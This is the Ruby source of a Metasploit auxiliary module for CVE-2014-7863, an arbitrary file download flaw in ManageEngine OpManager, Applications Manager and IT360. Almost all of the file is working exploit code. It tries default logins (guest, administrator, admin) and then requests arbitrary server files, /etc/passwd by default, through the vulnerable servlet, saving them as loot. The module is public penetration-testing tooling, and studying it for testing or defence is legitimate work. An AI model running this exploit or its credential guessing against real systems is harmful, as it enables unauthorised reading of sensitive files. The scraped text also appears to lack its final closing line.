# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Auxiliary::Report
include Msf::Exploit::Remote::HttpClient
def initialize(info={})
super(update_info(info,
&#039;Name&#039; => "ManageEngine Multiple Products Arbitrary File Download",
&#039;Description&#039; => %q{
This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet
on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is
unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This
module will attempt to login using the default credentials for the administrator and
and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually
8300). This module has been tested on both Windows and Linux with several different
versions. Windows paths have to be escaped with 4 backslashes on the command line. There is
a companion module that allows you to list the contents of any directory recursively. This
vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.
},
&#039;Author&#039; =>
[
&#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039;, # Vulnerability Discovery and Metasploit module
],
&#039;License&#039; => MSF_LICENSE,
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2014-7863&#039;],
[&#039;OSVDB&#039;, &#039;117695&#039;],
[&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_failservlet.txt&#039;],
[&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Jan/114&#039;]
],
&#039;DisclosureDate&#039; => &#039;Jan 28 2015&#039;))
register_options(
[
Opt::RPORT(80),
OptString.new(&#039;TARGETURI&#039;, [true, "The base path to OpManager, AppManager or IT360", &#039;/&#039;]),
OptString.new(&#039;FILEPATH&#039;, [true, &#039;Path of the file to download&#039;, &#039;/etc/passwd&#039;]),
OptString.new(&#039;IAMAGENTTICKET&#039;, [false, &#039;Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)&#039;]),
OptString.new(&#039;USERNAME&#039;, [false, &#039;The username to login as (IT360 target only)&#039;]),
OptString.new(&#039;PASSWORD&#039;, [false, &#039;Password for the specified username (IT360 target only)&#039;]),
OptString.new(&#039;DOMAIN_NAME&#039;, [false, &#039;Name of the domain to logon to (IT360 target only)&#039;])
], self.class)
end
def get_cookie
cookie = nil
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;])
})
if res
cookie = res.get_cookies
end
cookie
end
def detect_it360
res = send_request_cgi({
&#039;uri&#039; => &#039;/&#039;,
&#039;method&#039; => &#039;GET&#039;
})
if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
return true
end
return false
end
def get_it360_cookie_name
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039; => normalize_uri(&#039;/&#039;)
})
cookie = res.get_cookies
if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
return $1
else
return nil
end
end
def authenticate_it360(port, path, username, password)
if datastore[&#039;DOMAIN_NAME&#039;].nil?
vars_post = {
&#039;LOGIN_ID&#039; => username,
&#039;PASSWORD&#039; => password,
&#039;isADEnabled&#039; => &#039;false&#039;
}
else
vars_post = {
&#039;LOGIN_ID&#039; => username,
&#039;PASSWORD&#039; => password,
&#039;isADEnabled&#039; => &#039;true&#039;,
&#039;domainName&#039; => datastore[&#039;DOMAIN_NAME&#039;]
}
end
res = send_request_cgi({
&#039;rport&#039; => port,
&#039;method&#039; => &#039;POST&#039;,
&#039;uri&#039; => normalize_uri(path),
&#039;vars_get&#039; => {
&#039;service&#039; => &#039;OpManager&#039;,
&#039;furl&#039; => &#039;/&#039;,
&#039;timestamp&#039; => Time.now.to_i
},
&#039;vars_post&#039; => vars_post
})
if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
# /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
return res.get_cookies
end
nil
end
def login_it360
# Do we already have a valid cookie? If yes, just return that.
unless datastore[&#039;IAMAGENTTICKET&#039;].nil?
cookie_name = get_it360_cookie_name
cookie = &#039;IAMAGENTTICKET&#039; + cookie_name + &#039;=&#039; + datastore[&#039;IAMAGENTTICKET&#039;] + &#039;;&#039;
return cookie
end
# get the correct path, host and port
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039; => normalize_uri(&#039;/&#039;)
})
if res && res.redirect?
uri = [ res.redirection.port, res.redirection.path ]
else
return nil
end
if datastore[&#039;USERNAME&#039;] && datastore[&#039;PASSWORD&#039;]
print_status("#{peer} - Trying to authenticate as #{datastore[&#039;USERNAME&#039;]}/#{datastore[&#039;PASSWORD&#039;]}...")
cookie = authenticate_it360(uri[0], uri[1], datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
unless cookie.nil?
return cookie
end
end
default_users = [&#039;guest&#039;, &#039;administrator&#039;, &#039;admin&#039;]
default_users.each do |user|
print_status("#{peer} - Trying to authenticate as #{user}...")
cookie = authenticate_it360(uri[0], uri[1], user, user)
unless cookie.nil?
return cookie
end
end
nil
end
def run
# No point to continue if filepath is not specified
if datastore[&#039;FILEPATH&#039;].empty?
print_error(&#039;Please supply the path of the file you want to download.&#039;)
return
end
if detect_it360
print_status("#{peer} - Detected IT360, attempting to login...")
cookie = login_it360
if cookie.nil?
print_error("#{peer} - Failed to login to IT360!")
return
end
else
cookie = get_cookie
end
servlet = &#039;com.adventnet.me.opmanager.servlet.FailOverHelperServlet&#039;
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;cookie&#039; => cookie,
&#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;servlet&#039;, servlet),
})
if res && res.code == 404
servlet = &#039;FailOverHelperServlet&#039;
end
# Create request
begin
print_status("#{peer} - Downloading file #{datastore[&#039;FILEPATH&#039;]}")
res = send_request_cgi({
&#039;method&#039; => &#039;POST&#039;,
&#039;cookie&#039; => cookie,
&#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;servlet&#039;, servlet),
&#039;vars_get&#039; => {
&#039;operation&#039; => &#039;copyfile&#039;,
&#039;fileName&#039; => datastore[&#039;FILEPATH&#039;]
}
})
rescue Rex::ConnectionRefused
print_error("#{peer} - Could not connect.")
return
end
# Show data if needed
if res && res.code == 200
if res.body.to_s.bytesize == 0
print_error("#{peer} - 0 bytes returned, file does not exist or is empty.")
return
end
vprint_line(res.body.to_s)
fname = File.basename(datastore[&#039;FILEPATH&#039;])
path = store_loot(
&#039;manageengine.http&#039;,
&#039;application/octet-stream&#039;,
datastore[&#039;RHOST&#039;],
res.body,
fname
)
print_good("File saved in: #{path}")
else
print_error("#{peer} - Failed to download file.")
end
end


